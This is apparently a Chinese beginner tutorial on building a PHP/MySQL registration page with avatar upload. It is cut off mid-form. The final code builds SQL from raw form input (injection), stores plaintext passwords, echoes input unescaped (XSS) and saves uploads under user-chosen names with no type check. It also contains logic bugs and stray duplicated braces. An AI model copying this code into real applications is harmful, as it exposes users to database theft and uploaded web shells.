<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | Field | Type | Null | Key |</span></span><br><span class="line"><span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | id | int(10)</span></span><br><span class="line">unsigned <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> auto_increment <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> pass <span class="operator">|</span></span><br><span class="line"><span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> phone <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+--</span></span><br><span class="line"><span class="comment">---+---------+----------------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>增加数据</p>
<ul>
<li><code>insert into kkk_tbl(user,pass,phone) values('admin','123456','1380000000');</code></li>
</ul>
</li>
<li>
<p>删除数据</p>
<ul>
<li><code>delete from kkk_tbl where user=&quot;admin&quot;;</code></li>
</ul>
</li>
</ul>
<h2 id="PHP联动MySQL"><a class="header-anchor" href="#PHP联动MySQL">¶</a>PHP联动MySQL</h2>
<ul>
<li>PHP创建数据库</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 面向过程</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;  <span class="comment">// 数据库名为myDB</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>连接数据</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其他需要调用该文件的php</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;create DATABASE myDaB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>面向对象的</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用PDO</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> 		<span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>&quot;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">	<span class="comment">// 设置 PDO 错误模式为异常</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, 	PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDBPDO&quot;</span>;</span><br><span class="line"><span class="comment">// 使用 exec() ，因为没有结果返回</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="literal">null</span>;  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>创建表（面对过程）</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要设置进去的库</span></span><br><span class="line">conn.php 文件 新增</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>生成表内基本框架</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">`id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">`user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`phone` INT(11) NOT NULL,</span></span><br><span class="line"><span class="string">PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">)ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;创建数据表错误: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="注册界面任务分解"><a class="header-anchor" href="#注册界面任务分解">¶</a>注册界面任务分解</h2>
<h4 id="网站注册界面-网站首页"><a class="header-anchor" href="#网站注册界面-网站首页">¶</a>网站注册界面/网站首页</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian; 输出验证</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line"><span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line"><span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line"><span class="comment">//密码验证</span></span><br><span class="line"><span class="comment">//手机11位</span></span><br><span class="line"><span class="comment">//文件上传jpg</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">	<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h4>
<p>​	1、先判断是否有库，如果没有库就创建</p>
<p>​	2、判断是否有表，没有表直接创建</p>
<p>​	3、注册成功后直接将数据插入到表的内容里面</p>
<h4 id="最后代码"><a class="header-anchor" href="#最后代码">¶</a>最后代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// conn.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">    `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">    `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">    `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">	PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">	<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 最后整合.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$password1</span>) &amp;&amp;</span><br><span class="line">		<span class="keyword">empty</span>(<span class="variable">$password2</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;用户名、密码、手机号码不能为空&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;密码长度必须大于等于8位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;两次密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="number">11</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;手机号码不符合规范&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//开始处理图片</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tupian</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">		<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件存储在:tupian/&quot;</span>.<span class="variable">$tupianfile</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;</span></span><br><span class="line"><span class="string">	insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	values(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianfile</span>&#x27;);</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sqlinsert</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; 